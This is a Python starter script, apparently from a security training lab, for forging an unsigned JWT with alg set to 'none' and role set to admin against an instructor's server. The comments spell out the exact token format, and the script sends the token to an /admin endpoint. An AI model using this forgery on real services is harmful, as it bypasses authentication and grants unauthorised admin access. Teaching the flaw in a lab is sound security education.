#!/usr/bin/env python3
"""
JWT alg=none forgery -- STARTER. Forge an admin token with NO signature.

Usage:  python client.py                        # 127.0.0.1:5004
        python client.py http://10.0.0.5:5004    # the instructor's server

Deps:   pip install requests pycryptodome   (JWT helpers in jwt_toy.py, same folder)
"""
import sys

import requests
import jwt_toy as jwt          # same folder: jwt._part(dict) -> one base64url JWT segment

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5004"

# A JWT is three base64url parts joined by dots:   header . payload . signature
# The signature is what's supposed to stop you from editing the payload.
#
# But THIS server trusts the token's OWN "alg" header to decide how to verify it.
# So you get to choose the algorithm -- including "none", the "I don't need a
# signature" algorithm. Pick alg="none" and the server accepts the token WITHOUT
# checking any signature at all. You just hand yourself role=admin.
#
# jwt._part(obj) turns a dict into one base64url JWT segment for you. These two
# are the header and payload you want:
header_seg  = jwt._part({"alg": "none", "typ": "JWT"})
payload_seg = jwt._part({"user": "guest", "role": "admin"})

# TODO: assemble `token` from the two segments above as an alg=none JWT.
#       An alg=none token has an EMPTY signature -- so it ends in a dot with
#       nothing after it:   header_seg  +  "."  +  payload_seg  +  "."
#       (That trailing dot is the whole trick -- don't drop it.)
#
# token = ...

# ---- your one line here ----

resp = requests.get(f"{BASE}/admin", params={"token": token}).json()
print(resp)
